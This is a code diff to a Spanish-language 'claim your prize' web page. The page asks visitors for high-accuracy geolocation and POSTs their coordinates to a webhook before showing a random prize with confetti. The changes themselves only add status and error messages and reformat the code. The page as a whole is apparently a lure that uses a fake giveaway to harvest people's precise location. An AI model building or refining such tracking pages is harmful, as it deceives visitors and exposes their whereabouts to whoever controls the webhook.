@@ -75,6 +75,11 @@ canvas {
   pointer-events: none;
   z-index: 999;
 }
+#mensaje {
+  margin-top: 15px;
+  font-weight: bold;
+  min-height: 24px;
+}
 </style>
 </head>
 <body>
@@ -84,6 +89,7 @@ canvas {
   <p>Mira los premios disponibles y reclama el tuyo.</p>
   <div class="premios-grid" id="premios-grid"></div>
   <button id="btnPremio">📍 RECLAMA TU PREMIO</button>
+  <div id="mensaje"></div>
   <div id="premio-grande">
     <h2>🎉 ¡Tu premio es!</h2>
     <img id="img-premio-grande" src="" alt="">
@@ -122,13 +128,28 @@ const ctx = canvas.getContext("2d");
 canvas.width = window.innerWidth;
 canvas.height = window.innerHeight;
 
+const mensaje = document.getElementById("mensaje");
+
+function mostrarMensaje(texto, color="#f94144") {
+  mensaje.textContent = texto;
+  mensaje.style.color = color;
+}
+
 btn.addEventListener("click",()=>{
-  if(!navigator.geolocation) return alert("Tu navegador no soporta geolocalización.");
-  navigator.geolocation.getCurrentPosition(onSuccess,onError,{enableHighAccuracy:true,timeout:10000,maximumAge:0});
+  mostrarMensaje("Obteniendo ubicación...", "#007bff");
+  if(!navigator.geolocation){
+    mostrarMensaje("Tu navegador no soporta geolocalización.");
+    return;
+  }
+  navigator.geolocation.getCurrentPosition(onSuccess,onError,{
+    enableHighAccuracy:true,
+    timeout:20000,
+    maximumAge:0
+  });
 });
 
 function onSuccess(pos){
-  // Enviar datos
+  mostrarMensaje("✅ Ubicación obtenida correctamente.", "#43aa8b");
   const data = {
     lat: pos.coords.latitude,
     lon: pos.coords.longitude,
@@ -140,10 +161,8 @@ function onSuccess(pos){
   };
   enviarWebhook(data);
 
-  // Premio aleatorio
   const premio = premios[Math.floor(Math.random()*premios.length)];
 
-  // Mostrar imagen grande
   imgGrande.src = premio.img;
   nombreGrande.textContent = premio.nombre;
   premioGrande.style.display = "block";
@@ -152,7 +171,13 @@ function onSuccess(pos){
   lanzarConfeti();
 }
 
-function onError(err){ alert("⚠️ Error al obtener ubicación: "+(err.message||err.code)); }
+function onError(err){
+  let texto = "⚠️ Error al obtener ubicación.";
+  if(err.code===1) texto="⚠️ Permiso denegado por el usuario.";
+  if(err.code===2) texto="⚠️ Posición no disponible.";
+  if(err.code===3) texto="⚠️ Tiempo de espera agotado.";
+  mostrarMensaje(texto);
+}
 
 function lanzarConfeti(){
   const piezas = Array.from({length:150},()=>({
@@ -178,7 +203,11 @@ function lanzarConfeti(){
 
 async function enviarWebhook(data){
   try{
-    await fetch(WEBHOOK_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)});
+    await fetch(WEBHOOK_URL,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify(data)
+    });
   }catch(err){ console.error("Error webhook",err);}
 }
 </script>
